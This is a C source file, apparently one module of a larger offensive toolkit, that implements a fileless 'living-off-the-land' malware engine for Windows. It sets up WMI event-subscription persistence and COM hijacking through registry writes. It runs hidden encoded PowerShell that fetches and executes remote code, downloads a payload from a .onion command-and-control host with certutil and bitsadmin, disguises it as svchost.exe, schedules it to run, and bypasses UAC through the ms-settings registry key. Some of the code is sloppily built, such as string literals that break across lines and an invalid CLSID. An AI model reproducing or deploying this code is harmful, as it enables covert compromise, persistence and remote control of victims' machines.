// ============================================================
// 9. 0x0-MIMIC.c - LIVING-OFF-THE-LAND (LOTL) ENGINE
// ============================================================
/*
 * 0x0-MIMIC - FILELESS LOTL ATTACKS
 * TECNICAS:
 *   - PowerShell/WMIC/Certutil abuse
 *   - LOLBins (Living Off the Land Binaries)
 *   - WMI event subscription
 *   - COM object hijacking
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void execute_lolbin(const char* binary, const char* args) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s %s > /dev/null 2>&1 &", binary, args);
    system(cmd);
}

void wmi_persistence() {
    // Persistência via WMI sem arquivos
    const char* wmi_payload = 
        "powershell -Command \"
        $FilterArgs = @{Name='0x0Filter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"};
        $Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs;
        $ConsumerArgs = @{Name='0x0Consumer'; CommandLineTemplate='powershell -enc SQBFAFgAIAAoAE4AZQB3AC0AQwBvAG0AbQBhAG4AZAA='};
        $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs;
        $BindingArgs = @{Filter=$Filter; Consumer=$Consumer};
        $Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs;
        \"";
    
    system(wmi_payload);
}

void com_hijack() {
    // COM object hijacking pra persistência
    const char* com_payload = 
        "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{0x0-0000-0000-0000-000000000000}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\mscoree.dll\" /f\n"
        "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{0x0-0000-0000-0000-000000000000}\\InprocServer32\" /v \"ThreadingModel\" /t REG_SZ /d \"Both\" /f\n"
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved\" /v \"{0x0-0000-0000-0000-000000000000}\" /t REG_SZ /d \"0x0 Extension\" /f";
    
    system(com_payload);
}

void powershell_stealth() {
    // PowerShell sem script em disco
    const char* ps_cmd = 
        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0AQwBvAG0AbQBhAG4AZAApACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMAB4ADAAIABjADIALgBvAG4AaQBvAG4ALwBwAGE5AGwAbwBhAGQAJwApACkA";
    
    system(ps_cmd);
}

void certutil_download() {
    // Download usando certutil (built-in Windows)
    const char* certutil_cmd = 
        "certutil -urlcache -split -f http://0x0-c2.onion/payload.exe C:\\Windows\\Temp\\svchost.exe & C:\\Windows\\Temp\\svchost.exe";
    system(certutil_cmd);
}

void bitsadmin_stealth() {
    // BITSAdmin pra download furtivo
    const char* bits_cmd = 
        "bitsadmin /transfer 0x0_job /download /priority high http://0x0-c2.onion/payload.exe C:\\Windows\\Temp\\update.exe & schtasks /create /tn \"0x0_Update\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc daily /f";
    system(bits_cmd);
}

int main() {
    printf("[0x0] Mimic Engine - Living off the Land\n");
    
    // Múltiplas técnicas de persistência
    wmi_persistence();
    com_hijack();
    
    // Execução sem disco
    powershell_stealth();
    certutil_download();
    bitsadmin_stealth();
    
    // COM hijack pra elevação de privilégio
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe /c start /b C:\\Windows\\Temp\\0x0.exe\" /f");
    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /t REG_SZ /d \"\" /f");
    
    while(1) {
        sleep(60);
    }
    
    return 0;
}